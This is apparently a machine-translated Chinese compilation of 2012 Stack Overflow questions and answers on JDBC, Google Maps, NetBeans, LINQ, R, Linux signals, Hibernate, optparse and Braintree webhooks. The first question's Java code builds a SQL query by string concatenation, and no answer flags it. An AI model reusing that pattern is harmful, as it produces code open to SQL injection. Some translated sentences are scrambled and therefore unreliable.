> ID：12461040
> 
> 赞同：3
> 
> 时间：2012-09-17T14:07:33.973
> 
> 标签：java, sql-server, jdbc, datasource, classnotfoundexception

当我运行以下代码段以连接到数据源以通过查询获取数据时：

```
 try {
        String driver = "com.microsoft.jdbc.sqlserver.SQLServerDriver";
        Class.forName(driver);
        String Url = "jdbc:sqlserver://localhost:1433;databaseName=movies";
        Connection connection = DriverManager.getConnection(Url,"sa", "xxxxxxx);
        //            Context initContext = new InitialContext();
        //            Context envContext = (Context)initContext.lookup("java:comp/env");
        //            DataSource ds = (DataSource)envContext.lookup("");
        //            Connection connection = ds.getConnection();
        String query_name = "select name from list where name='" + data + "'"; 
```

显示此异常跟踪：

```
java.lang.ClassNotFoundException: com.microsoft.jdbc.sqlserver.SQLServerDriver
at java.net.URLClassLoader$1.run(URLClassLoader.java:200)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:188)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:276)
at java.lang.ClassLoader.loadClass(ClassLoader.java:251)
at java.lang.ClassLoader.loadClassInternal(ClassLoader.java:319)
at java.lang.Class.forName0(Native Method)
at java.lang.Class.forName(Class.java:169)
at gui.MainGui.startSqlServerDataSearch(MainGui.java:148)
at gui.MainGui$3.run(MainGui.java:129)
at java.lang.Thread.run(Thread.java:619) 
```

为什么我会收到此异常？我已经与 sql server 建立了连接（通过加载[此处](http://go.microsoft.com/fwlink/?LinkId=245496)给出的驱动程序）并且可以看到在 sql server 中定义的数据库。以下快照说明了这一点：

![在此处输入图像描述](../Images/473d8cb473f778df95aaa8712690389c.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T14:08:47.287

定义了数据库，并且`Class.forName(driver)`；是不足够的。

您需要确保适当的**数据库驱动程序 jar**在类路径中。

# java - 更改 android 对话框 ActionBarSherlock 的颜色

> ID：12461046
> 
> 赞同：1
> 
> 时间：2012-09-17T14:07:48.093
> 
> 标签：java, android, android-alertdialog, actionbarsherlock

您好，我在我的应用程序中使用 actionbarsherlock 我已经对其进行了样式设置，但是当我想创建一个对话框时，它看起来像这样[http://tinypic.com/r/11ha0w2/6](http://tinypic.com/r/11ha0w2/6)所以我想将所有浅蓝色更改为另一种颜色。有人知道并可能给我一个如何实现这一目标的例子吗？

如何设置对话框的样式？

# javascript - GUnload 为 null 或未使用路线服务定义

> ID：12461051
> 
> 赞同：1
> 
> 时间：2012-09-17T14:07:59.040
> 
> 标签：javascript, google-maps-api-3

我在使用 Google Maps API V3 时遇到了一个我不理解的错误。我的初始地图显示得很好，但是当我尝试获取路线时，出现以下两个错误：

错误：属性“GUnload”的值为 null 或未定义，不是 Function 对象

错误：无法获取属性“setDirections”的值：对象为空或未定义

我没有在任何地方使用 GUnload，所以我不明白为什么会出现这个错误。就第二个错误而言，就好像路线服务有问题一样。

这是我的代码：

```
var directionsDisplay;
var directionsService = new google.maps.DirectionsService();
var map;
function initialize(address) {

  directionsDisplay = new google.maps.DirectionsRenderer();
  var geocoder = new google.maps.Geocoder();
  var latlng = new google.maps.LatLng(42.733963, -84.565501);
  var mapOptions = {
   center: latlng,
   zoom: 15,
   mapTypeId: google.maps.MapTypeId.ROADMAP
 };
 map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
 geocoder.geocode({ 'address': address }, function (results, status) {
   if (status == google.maps.GeocoderStatus.OK) {
     map.setCenter(results[0].geometry.location);
     var marker = new google.maps.Marker({
       map: map,
       position: results[0].geometry.location
     });
   } else {
     alert("Geocode was not successful for the following reason:  " + status);
   }
 });
 directionsDisplay.setMap(map);
}

function getDirections(start, end) {
 var request = {
  origin:start,
  destination:end,
  travelMode: google.maps.TravelMode.DRIVING
 };
 directionsService.route(request, function(result, status) {
  if (status == google.maps.DirectionsStatus.OK) {
    directionsDisplay.setDirections(result);
  } else {
    alert("Directions cannot be displayed for the following reason:  " + status);
  }
 });
} 
```

我对javascript不是很精通，所以我可能在那里犯了某种错误。我很感激我能得到的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T02:59:53.187

GUnload 是 Google Maps API v2 的东西。如果您收到一个未定义的错误，这意味着您的某些代码（或您的应用程序中包含的代码）正在使用它，并且您正在使用 Google Maps API v3，它没有提供它.

在没有看到更多上下文的情况下无法评论 setDirections 问题，但很可能是由于在加载 API 代码之前尝试调用它。

# netbeans - 在 Netbeans 7.2 中一次可以构建的最大文件数是多少

> ID：12461053
> 
> 赞同：1
> 
> 时间：2012-09-17T14:08:08.760
> 
> 标签：netbeans, netbeans-7, netbeans-platform, netbeans-7.2

我有一个项目，其中包含大约 2000 个要构建的文件（不包括库文件）。

在 netbeans 6.9 中，即使我将堆增加到 1 GB，也会出现“内存不足”错误。但我通过一次构建几个包来解决这个问题。

但在 netbeans 7.2 中，我无法做到这一点。即使对于包含 30 个文件的包，我有时也会收到“内存不足”错误。

那么，可以同时构建的最大文件数是多少？

我该如何克服这个问题？

堆大小为 1GB。

**更新：**

我的机器在 64 位机器上运行 Windows 7、32 位。目前，我无法重新安装 64 位 Windows 7。其他配置，4 GB RAM。英特尔酷睿 2 四核 CPU 2.66Hz。

**netbeans 配置：**

netbeans_default_options="-J-client -J-Xss2m -J-Xms384m -J-Xmx1024M -J-XX:PermSize=32m -J-Dapple.laf.useScreenMenuBar=true -J-Dapple.awt.graphics.UseQuartz=true - J-Dsun.java2d.noddraw=true -J-Dsun.zip.disableMemoryMapping=true"

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:11:44.810

我有一个包含有关源文件的 java 项目，它可以在几秒钟内`2400`构建好。`50``60`

我不希望 Netbeans 有限制，您可能遇到的任何限制都可能与硬件/设置有关。

我使用以下选项启动 Netbeans：

```
netbeans_default_options="-J-client -J-Xss32m -J-Xms256m -J-Xmx1g -J-XX:PermSize=64m -J-XX:+UseConcMarkSweepGC -J-Dapple.laf.useScreenMenuBar=true -J-Dapple.awt .graphics.UseQuartz=true -J-Dsun.java2d.noddraw=true -J-Dsun.zip.disableMemoryMapping=true"

```

这些选项位于`install_dir/etc/netbeans.conf`

**设置：**

`jdk1.6.0_33`在 Windows 7 64 位上运行具有 10GB 内存的 Core i7

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T19:33:45.487

“内存不足”可能是由堆大小或 permgen 大小引起的。您可以在 jdk/bin 中使用 jVisualVM 来监控内存使用情况。

根据您的设置，“-J-XX:PermSize=32m”除了 NetBeans 行为：“请注意，默认 -Xmx 和 -XX:MaxPermSize 会自动为您选择。”。我想这可能是由于 PermGen 的大小。

您可以尝试设置“-J-XX:PermSize=128m”（对于我来说，增加permsize后NetBeans的启动速度更快。）

# c# - 是否可以在不使用 foreach 的情况下重新创建此语句？

> ID：12461058
> 
> 赞同：5
> 
> 时间：2012-09-17T14:08:25.317
> 
> 标签：c#, .net, linq

> **可能重复：**
> [C#：是具有继承的泛型类型的运算符](https://stackoverflow.com/questions/11186493/c-is-operator-for-generic-types-with-inheritance)

是否可以在不使用 foreach 语句的情况下将类类型从 Deal 更改为 DealBookmarkWrapper 时将列表添加到另一个列表中？

```
var list = new List<IBookmarkWrapper>();
foreach (var deal in deals)
{
    list.Add(new DealBookmarkWrapper(deal));
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T14:09:26.783

如果你想要完全等价的：

```
var list = deals.Select(d => new DealBookmarkWrapper(d))
                .Cast<IBookmarkWrapper>()
                .ToList(); 
```

但是，如果您只是迭代元素并且并不真正需要 a `List`，则可以不调用`GetList()`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-17T14:09:31.833

```
var list = deals.Select(d => new DealBookmarkWrapper(d))
                .Cast<IBookmarkWrapper>()
                .ToList(); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-17T14:10:29.770

怎么样

```
 var list = deals.ConvertAll(item=>new DealBookmarkWrapper(item)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:32:16.893

这个问题明确要求“将一个列表添加到另一个列表中”，所以这个问题也可能很有趣：

```
var list = new List<IBookmarkWrapper>();  //already existing
...  
deals.Aggregate(list, (s, c) => 
                      { 
                        s.Add(new DealBookmarkWrapper(c)); 
                        return s; 
                      }); 
```

# r - 在庞大的数据集上应用 ks.test

> ID：12461060
> 
> 赞同：0
> 
> 时间：2012-09-17T14:08:29.220
> 
> 标签：r

我正在寻找 ks.test 以便在两个分布之间进行比较。因此，这是我进行的方式：

1.  我`vec1`从一个文件加载`length(vec1) = 720642`：这是一个太大的数据集。

2.  我申请`fitdistr(vec1,"lognormal")`了 -> 在这里我得到了最合适的`meanlog=1.69`，`sdlog=1.02`最适合的分布`vec1`

3.  当我简单地申请时：

    `ks.test(vec1, "plnorm", 1.69, 1.02)`

    我得到：`D = 0.1429`，`p-value < 2.2e-16` 备择假设：双边

所以测试失败了，就像我没有处理对数正态分布......

有没有人解决这个问题？是因为我从文件中加载了一个庞大的数据集吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-04-14T04:09:26.313

对于大数据集，由于大数据集的强大功效，您将始终拒绝 H0（具有任何指定的参考分布）。

# c - 睡眠过程不响应信号

> ID：12461061
> 
> 赞同：0
> 
> 时间：2012-09-17T14:08:39.407
> 
> 标签：c, linux, signals, fork

我有一个程序，其中主进程分叉成 4 个相互合作的子进程：

process0 正在打开 FIFO 文件（O_WRONLY），使用 read 函数从 STDIN 一次读取 1 个字节，使用 write 写入 FIFO 并关闭 FIFO 文件

process1 正在等待共享内存为空（我正在使用共享内存表的第一个字节 if(tab[0] == 0) 检查它是否为空）打开 FIFO 文件（O_RDONLY），从中读取，翻译这个一个字节转换为十六进制并将其保存到共享内存中。然后它关闭 fifo 并将作为共享内存表的 tab[0] 设置为 1。

如果 tab[0] == 1，则 process2 正在从共享内存中读取。读取后将数据写入管道

process3 正在从管道读取并写入 STDIN

这一切都很完美。当我想添加信号时，问题就开始了。我正在使用信号量来同步 p0 和 p1，使用信号来同步 p1 和 p2，并使用消息队列来同步 p2 和 p3。它也可以正常工作，除了例如 process1 处于睡眠模式的时候。当它想从 fifo 读取并必须等待数据传输时，它会进入此模式。我猜。我一直在阅读它。

[进程层次结构](http://imageshack.us/a/img853/6655/asdasdasdcf.jpg)

以下是我发现的原因，我认为可能是原因：

“当进程在用户模式 ​​(1) 下进行系统调用时，它会进入状态 2，开始在内核模式下运行。假设此时进行的系统调用是读取硬盘上的文件。因为读取不是立即进行的，进程进入睡眠状态，等待系统已经读取磁盘并且数据准备好。现在处于状态4。当数据准备好时，进程被唤醒。这并不意味着它立即运行，而是它再次准备好在主内存中运行 (3)。”

我想我明白了，但我怎样才能避免这种情况呢？我希望我的程序始终对信号做出反应。当我通过“kill”发送信号时，是否有某种方法可以将进程状态从睡眠状态更改为运行状态？我可以以某种方式告诉进程停止“等待系统已读取磁盘并且数据准备就绪的事件”吗？

如果有人想看，这是我的代码：

[程序代码](http://pastebin.com/DdfnSSju)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:22:45.443

如果我正确理解您的问题，则进程 1 将在第 442 行（源）挂断并且没有响应信号，因为它位于`read`.

显而易见的答案是不要做阻塞`read()`。检查描述符以查看是否有任何可读取的内容，如果没有则继续。阅读`fcntl`/`ioctl`以及如何进行非阻塞读取。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:33:37.130

如果出现信号，您的观察结果可能是（大多数）系统调用默认重新启动。简而言之，这意味着在传递信号时卡在系统调用中的代码会唤醒到用户空间，但在信号处理程序运行后恢复系统调用。

如果使用[sigaction](http://pubs.opengroup.org/onlinepubs/007904975/functions/sigaction.html) () 而不是 signal() 函数来建立信号处理程序，则系统调用在捕获信号时不会重新启动，而是会失败并将 errno 设置为 EINTR。这意味着您必须处理这样一个事实，即系统调用可能由于传递的信号而在任何地方“失败”。

（signal()默认会在linux重启时引起系统调用，在包含signal.h头文件之前可以通过一些特性宏来控制。sigaction()是否引起系统调用重启由建立信号时的SA_RESTART标志控制处理程序）

# search - 导入全文然后拆分为截断和关键字形式

> ID：12461063
> 
> 赞同：0
> 
> 时间：2012-09-17T14:08:45.820
> 
> 标签：search, solr, lucene

我遇到了一些障碍，希望得到一些指导。我想索引一大块文本，如下所示：

> 几个男人在一个高尔夫俱乐部的更衣室里。长凳上的手机响起，一名男子启用免提扬声器功能并开始讲话。房间里的其他人都停下来听。男人挂断了。更衣室里的其他人都惊讶地看着他。然后他笑着问道：“有谁知道谁的电话？？？！！！”

*我不想像在 Solr 中那样存储这个全文*，我想拥有它的两个版本。一种是截断形式，一种是关键字形式。

**截断形式：**

> 几个男人在一个高尔夫俱乐部的更衣室里。长凳上的手机响起，一名男子启用免提扬声器功能并开始讲话。其他所有人...

**关键字形式（使用停用词删除常用词）：**

> 几个男人更衣室高尔夫俱乐部手机长凳铃声男人使用免提扬声器功能开始通话其他房间都停止听男人挂断其他男人更衣室看着他惊讶的微笑问谁知道谁的电话

我该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T22:07:55.077

只需在客户端执行这些转换，然后在 Solr 中为每个版本设置两个字段。

# android - android：如何使用 FragmentStatePagerAdapter 简单的方法？

> ID：12461067
> 
> 赞同：1
> 
> 时间：2012-09-17T14:08:56.177
> 
> 标签：android, android-fragments, android-viewpager, viewpage

我正在寻找描述如何使用的任何教程或示例代码`FragmentStatePagerAdapter`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T00:14:29.740

我认为最好的教程是SDK 目录中可用`Fragment -> State Pager`的应用程序中的示例`Support v4 Demos``extras -> android -> support -> samples -> Support4Demos`

祝你好运！！

# android - 为列表视图编写自定义适配器

> ID：12461073
> 
> 赞同：0
> 
> 时间：2012-09-17T14:09:10.583
> 
> 标签：android, listview

我是否应该扩展 SimpleCursorAdapter 或 ResourceCursorAdapter 为我的列表视图提供自定义适配器。两者有什么区别？

数据将从 sqlite 数据库中填充。此外，我将使用 CursorLoader 来处理游标生命周期并在单独的线程中执行数据库活动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:23:52.027

你想去`BaseAdapter`

那里有很多教程，只需搜索自定义列表视图适配器

# java - 如何在调用活动时将菜单设置为可见？

> ID：12461077
> 
> 赞同：0
> 
> 时间：2012-09-17T14:09:21.120
> 
> 标签：java, android

> **可能重复：**
> [如何以编程方式打开选项菜单？](https://stackoverflow.com/questions/3133318/how-to-open-the-options-menu-programmatically)

我从这里阅读了很多帖子，发现了一个代码，我可以用它来帮助我显示菜单选项，而不是从模拟器中单击菜单按钮。但我不知道在哪里放置代码。

这是代码：

```
Activity.openOptionsMenu(); 
```

放在`onCreate`方法里了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:15:49.750

将它放在`onAttachedToWindow()`创建活动及其视图并将窗口附加到屏幕时调用的方法中。（您的问题是菜单中不存在`onCreate`，因为它仍在初始化中）。

你会想在你的活动中做这样的事情：

```
public void onAttachedToWindow() {
    openOptionsMenu(); 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:11:35.893

如果您在 onCreate 方法中执行此操作，显然它不起作用。看看这些帖子：

[https://stackoverflow.com/a/8676419/349012](https://stackoverflow.com/a/8676419/349012)

[https://stackoverflow.com/a/10220312/349012](https://stackoverflow.com/a/10220312/349012)

# java - hibernate 4.1.7.Final 与未知表 id 按映射顺序排列

> ID：12461078
> 
> 赞同：2
> 
> 时间：2012-09-17T14:09:24.473
> 
> 标签：java, hibernate, postgresql, jpa-2.0, jboss7.x

我正在尝试从 4.0.1 升级到休眠 4.1.7.Final，但出现以下错误：

```
Failed to start service jboss.persistenceunit."****/********": org.jboss.msc.service.StartException in service jboss.persistenceunit."*****": Failed to start service
at org.jboss.msc.service.ServiceControllerImpl$StartTask.run(ServiceControllerImpl.java:1767) [jboss-msc-1.0.2.GA.jar:1.0.2.GA]
at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_35]
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_35]
at java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_35] 

Caused by: javax.persistence.PersistenceException: [PersistenceUnit: myatrium_intranet] Unable to build EntityManagerFactory
at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:915)
at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:890)
at org.hibernate.ejb.HibernatePersistence.createContainerEntityManagerFactory(HibernatePersistence.java:74)
at org.jboss.as.jpa.service.PersistenceUnitServiceImpl.createContainerEntityManagerFactory(PersistenceUnitServiceImpl.java:162)
at org.jboss.as.jpa.service.PersistenceUnitServiceImpl.start(PersistenceUnitServiceImpl.java:85)
at org.jboss.msc.service.ServiceControllerImpl$StartTask.startService(ServiceControllerImpl.java:1811) [jboss-msc-1.0.2.GA.jar:1.0.2.GA]
at org.jboss.msc.service.ServiceControllerImpl$StartTask.run(ServiceControllerImpl.java:1746) [jboss-msc-1.0.2.GA.jar:1.0.2.GA]
... 3 more
Caused by: org.hibernate.HibernateException: Could not locate table which owns column [id] referenced in order-by mapping
at org.hibernate.persister.entity.JoinedSubclassEntityPersister.determineTableNumberForColumn(JoinedSubclassEntityPersister.java:854)
at org.hibernate.persister.entity.AbstractEntityPersister.getTableAliasForColumn(AbstractEntityPersister.java:4865)
at org.hibernate.persister.collection.AbstractCollectionPersister$StandardOrderByAliasResolver.resolveTableAlias(AbstractCollectionPersister.java:1930)
at org.hibernate.sql.ordering.antlr.OrderByFragmentTranslator$StandardOrderByTranslationImpl.injectAliases(OrderByFragmentTranslator.java:106)
at org.hibernate.persister.collection.AbstractCollectionPersister.getSQLOrderByString(AbstractCollectionPersister.java:751)
at org.hibernate.loader.JoinWalker.orderBy(JoinWalker.java:910)
at org.hibernate.loader.JoinWalker.orderBy(JoinWalker.java:822)
at org.hibernate.loader.AbstractEntityJoinWalker.initStatementString(AbstractEntityJoinWalker.java:123)
at org.hibernate.loader.AbstractEntityJoinWalker.initStatementString(AbstractEntityJoinWalker.java:108)
at org.hibernate.loader.AbstractEntityJoinWalker.initAll(AbstractEntityJoinWalker.java:90)
at org.hibernate.loader.AbstractEntityJoinWalker.initAll(AbstractEntityJoinWalker.java:77)
at org.hibernate.loader.entity.CascadeEntityJoinWalker.<init>(CascadeEntityJoinWalker.java:51)
at org.hibernate.loader.entity.CascadeEntityLoader.<init>(CascadeEntityLoader.java:46)
at org.hibernate.persister.entity.AbstractEntityPersister.createLoaders(AbstractEntityPersister.java:3785)
at org.hibernate.persister.entity.AbstractEntityPersister.postInstantiate(AbstractEntityPersister.java:3722)
at org.hibernate.persister.entity.SingleTableEntityPersister.postInstantiate(SingleTableEntityPersister.java:1018)
at org.hibernate.internal.SessionFactoryImpl.<init>(SessionFactoryImpl.java:457)
at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1750)
at org.hibernate.ejb.EntityManagerFactoryImpl.<init>(EntityManagerFactoryImpl.java:94)
at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:905)
... 9 more 
```

我不知道休眠在说哪个表。有什么方法可以了解它吗？我还需要添加什么特别的东西才能让它工作吗？请注意，我的数据结构适用于 4.0.1。

任何帮助将非常感激。

更新：我已经打开了休眠的调试，我想知道如何找出哪个类导致了问题。有没有办法知道它来自哪个班级？只是提醒您，错误来自预加载查询，休眠在启动服务器之前执行。

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-18T23:35:55.090

我已经弄清楚了最终发生这种情况的情况，并且很快将使用 hibernate 提交错误报告，并在我这样做时将其链接到此处。如果您有一个使用 JOINED 的继承策略的实体，并且您将父实体引用为另一个实体中的集合并向集合添加 o​​rder by，则会引发 OP 发布的错误。

例如：

```
@Entity
@Table(name = "Joined_Parent")
@Inheritance(strategy = InheritanceType.JOINED)
public class JoinedParent
{
    @Id
    @GeneratedValue
    @Column(name = "id")
    private Integer id;

    @ManyToOne(cascade = {CascadeType.ALL})
    @JoinColumn(name = "other_entity_id", nullable = false)
    private OtherEntity otherEntity;
}

@Entity
@Table(name = "Joined_Child")
@PrimaryKeyJoinColumn(name = "id")
public class JoinedChild
    extends JoinedParent
{
}

@Entity
@Table(name = "Other_Entity")
public class OtherEntity
{
    @OneToMany(cascade = CascadeType.ALL, mappedBy = "otherEntity", orphanRemoval = true)
    @OrderBy("id ASC") // <-- this causes the error
    private List<JoinedParent> items = new ArrayList<JoinedParent>();
} 
```

我不确定这是否仅在您将父级作为集合引用时才会发生，或者它是否也与子实体一起发生。我也不确定是否有双向关系与它有任何关系。我在这里提交了一个错误报告[https://hibernate.onjira.com/browse/HHH-7630](https://hibernate.onjira.com/browse/HHH-7630)

# python - 使用 optparse 或 argparse 检测是否多次指定任何命令行选项

> ID：12461087
> 
> 赞同：4
> 
> 时间：2012-09-17T14:09:38.793
> 
> 标签：python, argparse, optparse

Python optparse 通常允许用户多次指定一个选项，并默默地忽略除最后一个选项之外的所有选项。例如，如果 option 的动作`--foo`是`store`并且 option 的动作`--flag`是 `store_const`, `store_true`or `store_false`，则以下命令将是等效的：

```
my-command --foo=bar --foo=another --flag --foo=last --flag
my-command --flag --foo=last 
```

（更新：argparse 默认做同样的事情。）

现在，我有很多选项，并且多次指定它们中的任何一个都没有意义。如果用户多次指定相同的选项，我想警告他们可能出现的错误。

检测多次指定的选项的最优雅方法是什么？请注意，相同的选项可以有短格式、长格式和缩写长格式（因此、 和`-f`都是`--foobar`相同的选项）。如果能够检测到同时指定具有相同*目的地*的多个选项的情况会更好，这样如果用户同时指定了两个选项并且两个选项都将值存储到相同的目的地并且有效地存储了一个值，则可以发出警告互相覆盖。`--foob``--foo`*`--quiet``--verbose`*

 *更新：为了更加用户友好，警告应该引用命令行上使用的确切选项名称。使用`append`动作代替`store`是可能的，但是当我们检测到冲突时，我们不能说是哪个选项导致了它（是它`-q`还是`--verbose`？`--quiet --quiet`）。

不幸的是，我坚持使用 optparse，无法使用 argparse，因为我必须支持 Python 2.6。

PS 如果您知道仅适用于 argparse 的解决方案，请也发布它。虽然我尽量减少外部依赖项的数量，但在 Python 2.6 下使用 argparse 仍然是一种选择。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:30:09.667

您可以使用`action="append"`( `optparse`) 然后检查附加元素的数量。请参阅[http://docs.python.org/library/optparse.html#other-actions](http://docs.python.org/library/optparse.html#other-actions)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T18:11:57.647

我认为正确的方法是以某种方式“定义你的行为”。

例如，您可以使用该操作[`callback`](http://docs.python.org/library/optparse.html#defining-a-callback-option)并实现一个实现所需行为的函数。您可以编写一个函数，首先检查目标是否已填充，如果已填充，则将重叠选项存储到列表中。解析完成后，您应该检查这些列表是否为空，如果它们没有引发适当的异常。

另一种方法是定义您自己的操作。你可以看看[这里](http://docs.python.org/library/optparse.html#adding-new-actions)

一个使用回调的小例子：

```
import sys
import functools
from optparse import OptionParser

bad_option = 'BAD OPTION'

def store(option, opt, value, parser, dest, val):
    """Set option's destination *dest* to *val*  if there are no conflicting options."""
    list_name = dest + '_options_list'
    try:
        # if this option is a conflict, save its name and set the value to bad_option
        getattr(parser.values, list_name).append(opt)
        setattr(parser.values, dest, bad_option)
    except AttributeError:
        # no conflicts, set the option value and add the options list
        setattr(parser.values, dest, val)
        setattr(parser.values, list_name, [opt])

store_true = functools.partial(store, val=True)
store_false = functools.partial(store, val=False)

parser = OptionParser()
parser.add_option('-v', '--verbose',
                  action='callback', callback=store_true,
                  help='Increase output verbosity',
                  callback_kwargs={'dest': 'verbose'})

parser.add_option('-q', '--quiet',
                  action='callback', callback=store_false,
                  help='Decrease output verbosity',
                  callback_kwargs={'dest': 'verbose'})

opts, args = parser.parse_args()

# detects all conflicting options for all destinations
found = False
for dest in ('verbose',):
    if getattr(opts, dest) == bad_option:
        conflicting_opts = ', '.join(getattr(opts, dest + '_options_list'))
        print('Conflicting options %s for destination %s'
              % (conflicting_opts, dest))
        found = True

if found:
    parser.print_usage()
    sys.exit(2) 
```

和输出：

```
$ python testing_optparse.py -v -q
Conflicting options -v, -q for destination verbose
Usage: prova_optparse.py [options] 
```

可能最好`OptionValueError`在检测冲突时提出一个，即使这将只允许获得几个冲突的选项。如果你想获得所有冲突的选项，你必须解析剩余的参数（in `parser.rargs`）。*

# android - 更好地膨胀或实例化 Android 中的控件？

> ID：12461090
> 
> 赞同：7
> 
> 时间：2012-09-17T14:09:45.860
> 
> 标签：android, performance, layout-inflater

我想知道是否有人可以对动态创建控件（膨胀与实例化）的最佳实践有所了解。

膨胀：

```
TextView styledText = (TextView)inflater.inflate(R.layout.styledTextView); 
```

实例化：

```
TextView styledText = new TextView(mContext);
styledText.setTextAppearance(R.style.StyledTextStyle); 
```

正在创建的对象可以包含扩展 XML 文件中的属性，也可以包含在样式定义中，该定义随后将添加到实例化对象中。（假设此样式包括宽度、背景、文本颜色等）。

无法对每种方法运行任何时间/内存测试，想知道是否有人知道哪种方法最快/最有效。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-17T14:21:06.377

LayoutInflator 有*一点*开销，因为它必须解析 xml 才能构建对象。出于同样的原因，它也会暂时占用更多内存。除此之外，它以与您相同的方式构建 View 对象。如果您出于某种原因每秒调用数百次，则可能需要担心。99.9% 的时间虽然你永远不会知道其中的区别。

还要注意，任何接受像“setTextAppearance”这样的 xml 资源的方法都将具有相同的 xml 解析开销。您提供的示例的唯一区别是它不解析 TextView xml，但它仍然必须解析样式属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-13T20:42:36.563

尽管这篇文章专门询问了控件，但我认为需要注意的是..对于使用要动态创建/添加的布局，我发现在使用`new`（又名实例化）方法时，我**无法**获得参考在我为其实例化布局对象引用的 xml 文件中定义的内部 ImageButton 元素。

当我使用该`inflate`方法时，ImageButton 在引用时出现。

所以在我的情况下：

*作品:)*

```
 LayoutInflater inflater = LayoutInflater.from(getActivity());
    CardView myCardView = (CardView) inflater.inflate(R.layout.my_cardview, null);
    ImageView icon = (ImageView) myCardView.findViewById(R.id.iconId); 
```

~~~~~~~~~~~~

*不工作:( .. 在这种情况下，变量**图标**为空*

CardView myCardView = new CardView(getActivity());

~~ImageView 图标 = (ImageView) myCardView.findViewById(R.id.iconId);~~

# php - 如何处理 BrainTree 中的 Webhook

> ID：12461094
> 
> 赞同：2
> 
> 时间：2012-09-17T14:09:51.573
> 
> 标签：php, webhooks, braintree

我正在尝试使用 BrainTree webhook 进行订阅交易，但无法让我的页面进行验证。

来自 BrainTree：[https ://www.braintreepayments.com/docs/php/webhooks/destination_verification](https://www.braintreepayments.com/docs/php/webhooks/destination_verification)

当您尝试添加目的地时，我们的服务器将使用名为 bt_challenge 的查询参数向提供的 URL 发出 GET 请求。此查询参数应传递给验证方法。调用此方法的结果应作为响应的主体返回。

```
Braintree_WebhookNotification::verify(bt_challenge_param); 
```

首先，我在 NodeJS 中进行了尝试（因为我们的事务以这种方式成功完成）：

```
//WEBHOOK GET PROCESS FOR BRAINTREE SUBSCRIPTION
app.get('/getwebhook', function(req, res){

    var bt_challenge_param = req.param('bt_challenge_param', null);
    var jsObj = new Object();

    jsObj.response = gateway.webhookNotification.verify(bt_challenge_param);

    res.json(JSON.stringify(jsObj));
}); 
```

我的 PHP 页面与 NodeJS 进程通信并将结果放入正文中。一旦这个验证失败，我就直接用 PHP 写了一个测试页面：

```
<?php
require_once 'lib/Braintree.php';

Braintree_Configuration::environment('production');
Braintree_Configuration::merchantId('mymid');
Braintree_Configuration::publicKey('mypubkey');
Braintree_Configuration::privateKey('myprodkey');

$bt_challenge = "";
if(isset($_GET['bt_challenge']))
{
    $bt_challenge = $_GET['bt_challenge'];
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>Webhooks</title>
  <meta name="viewport" content="width=device-width; initial-scale=1.0" />
</head>
<body>
<?php
if(isset($bt_challenge) && $bt_challenge != ""){
    echo Braintree_WebhookNotification::verify($bt_challenge);
}
?>
</body>
</html> 
```

但是，这也未能通过验证。不确定哪里出了问题，因为没有验证测试或任何错误迹象。我尝试联系 BrainTree 支持，但没有回复。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:39:27.590

您需要返回结果

```
Braintree_WebhookNotification::verify($bt_challenge); 
```

作为[响应](https://www.braintreepayments.com/docs/php/webhooks/destination_verification)的正文，而不是作为响应正文的 HTML 文档的正文。换句话说，你的整个文件应该是这样的：

```
<?php
require_once 'lib/Braintree.php';

Braintree_Configuration::environment('production');
Braintree_Configuration::merchantId('mymid');
Braintree_Configuration::publicKey('mypubkey');
Braintree_Configuration::privateKey('myprodkey');

$bt_challenge = "";
if(isset($_GET['bt_challenge']))
{
    $bt_challenge = $_GET['bt_challenge'];
}
if(isset($bt_challenge) && $bt_challenge != ""){
    echo Braintree_WebhookNotification::verify($bt_challenge);
}
?> 
```

如果您还有任何问题，请随时[联系 Braintree 支持](https://www.braintreepayments.com/support)。

披露：我在布伦特里工作。

# casperjs - casperjs下载文件而不指定url

> ID：12461096
> 
> 赞同：3
> 
> 时间：2012-09-17T14:10:08.403
> 
> 标签：casperjs

